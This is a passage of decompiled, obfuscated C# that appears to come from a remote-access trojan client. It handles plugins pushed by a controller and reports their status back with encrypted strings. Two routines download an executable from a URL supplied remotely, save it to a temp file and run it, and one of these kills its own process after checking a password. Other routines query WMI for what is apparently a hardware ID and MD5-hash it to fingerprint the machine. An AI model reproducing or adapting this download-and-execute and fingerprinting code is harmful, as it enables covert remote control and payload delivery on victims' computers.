		@class.method_7(new Class6(Class3.Enum0.const_15, data).method_0());
		@class.method_3();
		Class5.smethod_0(@class);
		class2 = null;
		data = null;
	}

	private static void smethod_9(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		Class3 @class = (Class3)sender;
		Class5.smethod_1(@class);
		@class.method_11();
		if (bool_0)
		{
			Thread.Sleep(TimeSpan.FromSeconds(30.0));
			bool_0 = false;
		}
		else if (bool_1)
		{
			Thread.Sleep(TimeSpan.FromSeconds(int_0));
			int_0 = 0;
			bool_1 = false;
		}
		if (GClass2.sortedList_1.Count > 0)
		{
			foreach (IPlugin value in GClass2.sortedList_1.Values)
			{
				if ((int)value.get_CurrentState() == 1 && value.get_StopOnDisconnection())
				{
					value.Stop(sender);
				}
			}
		}
		@class.method_0();
	}

	private static void smethod_10(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class3).method_9(((IPlugin)((sender is IPlugin) ? sender : null)).get_Name() + Class1.smethod_3("NRtOb/stWNRqa2tgXw==", bool_0: true));
			}
		}
		catch
		{
		}
	}

	private static void smethod_11(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class3).method_9(val.get_Name() + Class1.smethod_3("tJrN7np52efb7O7f3g==", bool_0: true));
			}
		}
		catch
		{
		}
	}

	private static void smethod_12(IPlugin iplugin_0, PluginArgs pluginArgs_0)
	{
		try
		{
			pluginArgs_0.PluginGuid = iplugin_0.get_Guid();
			if (iplugin_0.get_StateObject() != null)
			{
				Class3 @class = iplugin_0.get_StateObject() as Class3;
				@class.method_7(new Class6(Class3.Enum0.const_12, Serializer.Serialize(pluginArgs_0)).method_0());
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(Class1.smethod_3("ysbPwcPImr/MzMnMmqeayNvnennZ59+0mvWq96aav+zs6ey0mvWr9w==", bool_0: true), iplugin_0.get_Name(), ex.Message);
			(iplugin_0.get_StateObject() as Class3).method_9(iplugin_0.get_Name() + Class1.smethod_3("tJq/ennZ5+zs6ew=", bool_0: true));
		}
	}

	private static void smethod_13(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class3).method_9(val.get_Name() + Class1.smethod_3("tJq/8t96ednn3e/u394=", bool_0: true));
			}
		}
		catch
		{
		}
	}

	private static void smethod_14(object object_0)
	{
		object[] array = (object[])object_0;
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[1] as Class3).method_9(Class1.smethod_3("ASw0Kym99eEALB4hJisk", bool_0: true));
			webClient.DownloadFile((string)array[0], fileName);
			Process.Start(fileName);
			webClient.Dispose();
			(array[1] as Class3).method_9(Class1.smethod_3("AyYpIt0CvfXhADUiIDIxIiE=", bool_0: true));
		}
		catch
		{
			(array[1] as Class3).method_9(Class1.smethod_3("Ai8vLC/dASw0Kym99eEALB4hJisk3QMmKSI=", bool_0: true));
		}
	}

	private static void smethod_15(object object_0)
	{
		object[] array = (object[])object_0;
		if (array[1].ToString() != Encoding.Default.GetString(Class1.smethod_1(Convert.FromBase64String(Class10.string_10), bool_0: false)))
		{
			(array[2] as Class3).method_9(Class1.smethod_3("BiszHikmId299eEADR4wMDQsLyE=", bool_0: true));
			return;
		}
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[2] as Class3).method_9(Class1.smethod_3("ASw0Kym99eEALB4hJisk", bool_0: true));
			webClient.DownloadFile((string)array[0], fileName);
			(array[2] as Class3).method_9(Class1.smethod_3("Ei0hHr314QAxJisk", bool_0: true));
			if (Class10.bool_0)
			{
				Class7.smethod_3();
			}
			(array[2] as Class3).method_10(bool_1: false);
			Process.Start(fileName);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			(array[2] as Class3).method_9(Class1.smethod_3("Ai8vLC/dEr314QAtIR4xJisk", bool_0: true));
		}
	}

	private static void smethod_16()
	{
		new Thread(smethod_17).Start();
	}

	private static void smethod_17()
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(Class1.smethod_3("[/t0LIjHqFCIeMyLdICkmIisx3SYw3S8yKysmKyTdLCvdMSW99eEAJjDdDQDrxw0vIjAw3QwI3TEs3SApLDAi3TElIt0gKSYiKzHr]", bool_0: true), "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Process.GetCurrentProcess().Kill();
	}

	private static string smethod_18()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementClass val = new ManagementClass("NCYr8O8cLb314QAvLCAiMDAsLw==");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (text == "")
					{
						text = ((ManagementBaseObject)val2).get_Properties().get_Item(Class1.smethod_3("a21qXmD7LVjUbm5qbURf", bool_0: true)).get_Value()
							.ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string smethod_19(string string_1)
	{
		MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}
}
